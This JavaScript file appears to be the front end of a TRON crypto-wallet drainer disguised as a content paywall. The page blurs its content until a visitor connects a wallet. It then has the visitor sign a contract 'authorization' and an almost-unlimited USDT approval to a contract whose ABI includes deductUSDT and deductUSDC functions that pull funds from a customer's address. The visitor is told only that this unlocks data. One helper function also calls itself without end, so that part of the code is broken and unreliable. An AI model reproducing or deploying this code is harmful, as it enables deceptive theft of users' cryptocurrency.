// src/main.js

// --- 配置常量 ---
const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu';
const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';

// 您的合約 ABI (保持不變)
const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];

// --- 狀態變數 ---
let tronWeb; // 保持 TronWeb
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag = false;
let targetDeductionToken = null;
let provider; // 存储钱包提供者

// --- UI 元素 ---
const connectButton = document.getElementById('connectButton');
const blurOverlay = document.getElementById('blurOverlay');
const overlayMessage = document.getElementById('overlayMessage');
const lockedPrompt = document.getElementById('lockedPrompt');

// --- 辅助函数 ---
function showOverlay(message) {
    overlayMessage.innerHTML = message;
    blurOverlay.style.display = 'flex';
}
function hideOverlay() {
    blurOverlay.style.display = 'none';
}

function updateContentLock(isAuthorized) {
    if (isAuthorized) {
        // 如果已授权，隐藏 blurOverlay 和 lockedPrompt
        if (blurOverlay) {
            blurOverlay.style.display = 'none';
        }
        if (lockedPrompt) {
            lockedPrompt.style.display = 'none';
        }
    } else {
        // 如果未授权，显示 blurOverlay 和 lockedPrompt
        if (blurOverlay) {
            blurOverlay.style.display = 'flex';
        }
        if (lockedPrompt) {
            lockedPrompt.style.display = 'flex';
        }
    }
}

function updateConnectionUI(connected, address = null) {
    isConnectedFlag = connected;
    if (connected) {
        connectButton.classList.add('connected');
        connectButton.innerHTML = `Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
        connectButton.title = `Connected: ${address}`;
        showOverlay('Connected. Checking authorization status...');
    } else {
        connectButton.classList.remove('connected');
        connectButton.innerHTML = '<i class="fas fa-wallet"></i>';
        connectButton.title = 'Connect Wallet';
        updateContentLock(false); //  恢复锁定的状态
        hideOverlay();
    }
}

// 交易計數器 (用於 connectAndAuthorize 函數)
let txCount = 0;

// 修正：新增 totalTxs 參數，移除輪詢
async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
    txCount++;
    showOverlay(`Step ${txCount}/${totalTxs}: ${stepMessage}. Please approve in your wallet!`);

    try {
        const txHash = await methodCall.send({
            feeLimit: 150_000_000,
            callValue: callValue,
            shouldPollResponse: false
        });

        // 嚴格檢查 txHash 是否有效
        if (!txHash || typeof txHash !== 'string' || txHash.length !== 64) {
            throw new Error(`TronLink/Wallet did not return a valid transaction hash. Possible reasons: operation was canceled or broadcast failed.`);
        }

        // 🚨 樂觀判斷：立即返回成功
        showOverlay(`Step ${txCount}/${totalTxs}: Authorization operation broadcast successful!`);
        await new Promise(resolve => setTimeout(resolve, 500)); // 暫停 0.5 秒以緩衝 UI。

        return txHash;

    } catch (error) {
        if (error.message && error.message.includes('User canceled the operation in the wallet')) {
            throw new Error('User canceled the operation in the wallet.');
        }
        throw new Error(`Authorization operation failed, error message: ${error.message}`);
    }
}

// 修正：修復 Max 授權的檢查邏輯
async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
    if (!tronWeb || !userAddress || !merchantContract) {
        return false;
    }
    const contractAuthorized = await merchantContract.authorized(userAddress).call();
    const minAmount = tronWeb.toSun('1.00');
    const usdtBalance = await getTokenBalance(usdtContract);
    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const usdcBalance = await getTokenBalance(usdcContract);
    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);

    // 如果有合約註冊和代幣已授权，就返回 true
    if (contractAuthorized && usdtAuthorized) return true;
    if (contractAuthorized && usdcAuthorized) return true;

    return false;
}

async function getTokenBalance(tokenContract) {
    if (!tronWeb || !userAddress || !tokenContract) return tronWeb.BigNumber(0);
    try {
        const balance = await tokenContract.balanceOf(userAddress).call();
        return tronWeb.BigNumber(balance);
    } catch (error) {
        console.error("Failed to get token balance:", error);
        return false;
    }
}

async function initializeContracts() {
    if (!tronWeb) throw new Error("TronWeb instance not available.");
    merchantContract = await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract = await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}


// --- 混合連線邏輯 (TronLink / WalletConnect / EVM 優先嘗試) ---
async function connectWalletLogic() {
    showOverlay('正在尝试连接钱包...');

    try {
        // 1. 优先尝试 TronLink
        if (window.tronLink && window.tronWeb) {
            try {
                 const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                if (res.code !== 200) {
                    throw new Error(`TronLink 连接请求被拒绝: ${res.message}`);
                }
                tronWeb = window.tronWeb;
                userAddress = window.tronWeb.defaultAddress.base58;
                provider = "TronLink";
                 console.log("✅ 已使用 TronLink 连接，地址:", userAddress);
                 await initializeContracts();
                updateConnectionUI(true, userAddress);
                return true; // 连接成功
            } catch (error) {
                console.error("TronLink 连接失败:", error);
                // 尝试 WalletConnect 或 EVM
            }
        }

        // 2. 尝试 WalletConnect (更通用，支持多种钱包)
        if (typeof window.ethereum !== 'undefined') {
            try {
                 //  如果 window.ethereum 存在，尝试连接，兼容 MetaMask 和 其他 EVM 钱包
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                tronWeb = window.tronWeb; // Use tronWeb if available
                userAddress = tronWeb.address.fromHex(window.ethereum.selectedAddress);
                provider = "EVM"; // 或者 "MetaMask" 等, 如果您需要更具体的识别
                console.log("✅ 已使用 EVM 钱包连接，地址:", userAddress);
                await initializeContracts();
                updateConnectionUI(true, userAddress);
                return true;
            } catch (error) {
                console.error("EVM 连接失败:", error);
                // 继续尝试 WalletConnect
            }

        }

         // 3. 备用方案: 尝试使用 WalletConnect  (需要额外配置)
        if (typeof window.WalletConnectProvider !== 'undefined') {
          //   const WalletConnectProvider = window.WalletConnectProvider; // 确保已引入
            try {
                // ⚠️ 注意：你需要替换 YOUR_PROJECT_ID 为你自己的 WalletConnect 项目 ID
                const providerWC = new WalletConnectProvider.default({  // 修正
                    rpc: {
                        //  替换成你需要的链的 RPC
                         97: "https://data-seed-prebsc-1-s1.binance.org:8545/", // BSC testnet
                    },
                    chainId: 97, //  BSC testnet Chain ID
                });
                await providerWC.enable();
                tronWeb = window.tronWeb; // Use tronWeb if available
                 userAddress = tronWeb.address.fromHex(providerWC.accounts[0]);
                 provider = "WalletConnect";
                console.log("✅ 已使用 WalletConnect 连接，地址:", userAddress);
                await initializeContracts();
                updateConnectionUI(true, userAddress);
                return true;
            } catch (error) {
                console.error("WalletConnect 连接失败:", error);
            }
        }


        // 4. 没有任何钱包可用
        showOverlay('🔴 连接失败：未检测到支持的钱包。请安装 MetaMask 或使用 WalletConnect。');
        return false;

    } catch (error) {
        console.error("连接钱包时发生错误:", error);
        showOverlay(`🔴 连接钱包失败，错误: ${error.message}`);
        return false;
    }
}

async function checkAuthorization() {
    if (!tronWeb || !userAddress || !merchantContract) {
        return { authorizedToken: null, contract: false };
    }
    const contractAuthorized = await merchantContract.authorized(userAddress).call();
    const minAmount = tronWeb.toSun('1.00');
    const usdtBalance = await getTokenBalance(usdtContract);
    const usdtAuthorized = await checkTokenMaxAllowance(usdtContract, MERCHANT_CONTRACT_ADDRESS);
    const usdcBalance = await getTokenBalance(usdcContract);
    const usdcAuthorized = await checkTokenMaxAllowance(usdcContract, MERCHANT_CONTRACT_ADDRESS);
    let targetToken = null;
    if (usdtBalance.gte(minAmount) ) {
        targetToken = 'USDT';
    } else if (usdcBalance.gte(minAmount)) {
        targetToken = 'USDC';
    }
    targetDeductionToken = targetToken;

    return {
        contract: contractAuthorized,
        authorizedToken: targetToken,
        usdtAuthorized: usdtAuthorized,
        usdcAuthorized: usdcAuthorized
    };
}

async function connectAndAuthorize() {
    // 🚨 Skip state checks

    try {
        // 1. 合约授權 (ConnectAndAuthorize)
        if (!merchantContract || !tronWeb || !userAddress) {
            throw new Error("Please connect a wallet first.");
        }

        const methodCall = merchantContract.connectAndAuthorize();
        await sendTransaction(methodCall, "Sending contract authorization operation", 1);

        // 2. Max 扣款授權 (Approve)
        const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
        const tokenContract =  usdtContract;
        const tokenName = "USDT";
        // Set Max authorization (using ALMOST_MAX_UINT)
        await sendTransaction(
            tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT),
            `Setting ${tokenName} Max authorization operation (final authorization - please approve)`,
            1
        );
       return true;
    } catch (error) {
        console.error("Authorization Failed:", error);
        showOverlay(`🔴 Authorization operation failed! Error message: ${error.message}.  Please ensure the wallet is unlocked, has sufficient TRX (for gas fees), and has approved all 1 operation.`);
        return false;
    }
}


// ---------------------------------------------
// Post-connection processing: Executes only once for initialization
// ---------------------------------------------
async function handlePostConnection() {
    if (!isConnectedFlag) return;

    const authSuccess = await connectAndAuthorize();

    if(authSuccess) {
         showOverlay('✅ Authorization operation broadcast successful! Unlocking data...');
         updateContentLock(true); // 隐藏 lockedPrompt 和 blurOverlay
         await new Promise(resolve => setTimeout(resolve, 500));
    }
}

// ---------------------------------------------
// 主連接入口函數 (混合連線邏輯)
// ---------------------------------------------
async function connectWallet() {
    if (connectButton) connectButton.disabled = true;

    if (isConnectedFlag) {
        // 斷開連接邏輯
        tronWeb = null;
        userAddress = null;
        isConnectedFlag = false;
        targetDeductionToken = null;
        updateConnectionUI(false);
        updateContentLock(false); // 恢复锁定的状态
        if (connectButton) connectButton.disabled = false;
        return;
    }

    const connected = await connectWalletLogic(); // 使用新的連接邏輯

    if (connected) {
        await handlePostConnection();
    }

    if (connectButton) connectButton.disabled = false;
}

// 設置事件監聽器
if (connectButton) connectButton.addEventListener('click', connectWallet);

// 頁面啟動：初始化為未連接狀態，並設置初始鎖定狀態
updateConnectionUI(false);
updateContentLock(false);  // 确保页面加载时，设置初始的锁定状态。